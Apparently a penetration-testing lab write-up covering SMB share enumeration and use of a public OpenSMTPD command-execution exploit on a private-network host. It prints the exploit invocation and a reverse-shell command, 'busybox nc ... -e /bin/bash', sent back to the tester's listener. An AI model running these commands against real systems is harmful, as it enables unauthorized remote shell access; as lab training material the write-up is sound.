
# 445

Checking SMB, there's 2 shares:
![](attachment/6b4a4d9f3a228b5a142f71be8a6bb091.png)
Found passwd.bak:
![](attachment/3352ecd631699c7d38dc8d676936689a.png)
![](attachment/030abaf45ca00a705093078fcf065d36.png)


Now we can try an OpenSMTP exploit:
![](attachment/1bf94abcaed783932fb1ce02679f55c2.png)

```
searchsploit -m linux/remote/47984.py
```
testing out command execution:
```
python3 47984.py 192.168.182.71 25 'ping -c 10 192.168.45.236'
```
On our machine:
```
sudo tcpdump -i any -v icmp
```
![](attachment/4ada13a40cd4577817f136763ba560db.png)
We get back icmp packets

Now trying to get a shell back:
```
python3 47984.py 192.168.182.71 25 'busybox nc 192.168.45.236 445 -e /bin/bash'
```
on our machine:
```
sudo rlwrap nc -nlvp 445
```
![](attachment/d53a80d260fa991d40d7a4304cbd74fd.png)
![](attachment/31e9875e1ac86a8a495490f9e917c59f.png)
